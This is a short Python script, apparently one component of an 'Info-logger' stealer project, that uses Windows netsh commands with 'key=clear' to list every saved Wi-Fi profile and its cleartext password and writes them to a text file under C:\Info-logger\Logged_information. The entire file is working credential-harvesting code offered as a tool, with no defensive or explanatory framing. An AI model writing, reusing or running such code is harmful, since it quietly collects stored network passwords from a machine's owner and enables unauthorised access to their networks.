import subprocess

wifi_password = "wifi_password.txt"
wifi_password_e = 'e_wifi_password.txt'

file_path =  "C:\\Info-logger\\Logged_information" 
extend = "\\"
file_merge = file_path + extend

with open(file_path + extend + wifi_password, "w") as f:
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split(
            '\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            f.write("{:<30} -  {:<}\n".format(i, results[0]))
        except IndexError:
            f.write("{:<30} -  {:<}\n".format(i, ""))